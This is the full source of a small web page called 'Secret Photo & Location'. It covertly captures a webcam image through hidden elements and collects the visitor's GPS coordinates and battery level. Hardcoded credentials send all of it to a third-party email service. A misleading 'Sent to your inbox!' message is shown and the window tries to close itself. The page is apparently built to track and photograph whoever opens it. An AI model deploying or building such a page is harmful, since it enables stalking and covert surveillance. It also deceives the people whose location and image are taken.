<!DOCTYPE html>
<html>
<head>
  <title>Secret Photo & Location</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

    body {
      font-family: 'Poppins', sans-serif;
      text-align: center;
      background-color: #121212;
      color: #f5f5f5;
      margin: 0;
      padding: 50px 20px;
    }

    h2 {
      color: #ffffff;
      font-weight: 600;
      font-size: 26px;
      margin-bottom: 30px;
    }

    button {
      padding: 12px 28px;
      font-size: 16px;
      margin: 12px;
      cursor: pointer;
      border: none;
      border-radius: 10px;
      background: linear-gradient(135deg, #2196f3, #0d47a1);
      color: white;
      transition: transform 0.2s ease, background 0.3s ease;
    }

    button:hover {
      transform: scale(1.05);
      background: linear-gradient(135deg, #42a5f5, #1565c0);
    }

    #status {
      margin-top: 30px;
      font-weight: 500;
      font-size: 18px;
      color: #90caf9;
    }

    #video, #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h2>Secret Photo & Location</h2>
  <button onclick="sendLocationOnly()">Check Location Only</button>
  <button onclick="captureAndSend()">Take Picture + Location</button>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>
  <div id="status"></div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("vyxyeBFTfSi_ISmNG");

    function updateStatus(message, done = false) {
      const status = document.getElementById("status");
      status.textContent = message;
      if (done) {
        setTimeout(() => {
          window.close(); // Try to auto-close
        }, 5000);
      }
    }

    function sendLocationOnly() {
      updateStatus("Processing location... please wait");
      navigator.geolocation.getCurrentPosition(function(position) {
        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
        emailjs.send("service_gkkpt4w", "template_96dsagv", {
          message: message,
          image: ''
        })
        .then(() => updateStatus("Sent to your inbox!", true))
        .catch(() => updateStatus("Failed to send location."));
      }, function(error) {
        alert("Could not get location.");
        console.error(error);
      });
    }

    async function captureAndSend() {
      updateStatus("Processing image and location... please wait");
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");

      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      await new Promise(resolve => setTimeout(resolve, 1500));
      canvas.width = 160;
      canvas.height = 120;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageBase64 = canvas.toDataURL("image/png");
      stream.getTracks().forEach(track => track.stop());

      navigator.geolocation.getCurrentPosition(async function(position) {
        const coords = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
        let batteryLevel = "Unknown";

        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            batteryLevel = `${Math.round(battery.level * 100)}%`;
          } catch (err) {
            console.warn("Battery info not available", err);
          }
        }

        const message = `${coords}, Battery: ${batteryLevel}`;
        emailjs.send("service_gkkpt4w", "template_96dsagv", {
          message: message,
          image: imageBase64
        })
        .then(() => updateStatus("Sent to your inbox!", true))
        .catch(() => updateStatus("Failed to send photo and location."));
      }, function(error) {
        alert("Could not get location.");
        console.error(error);
      });
    }
  </script>
</body>
</html>
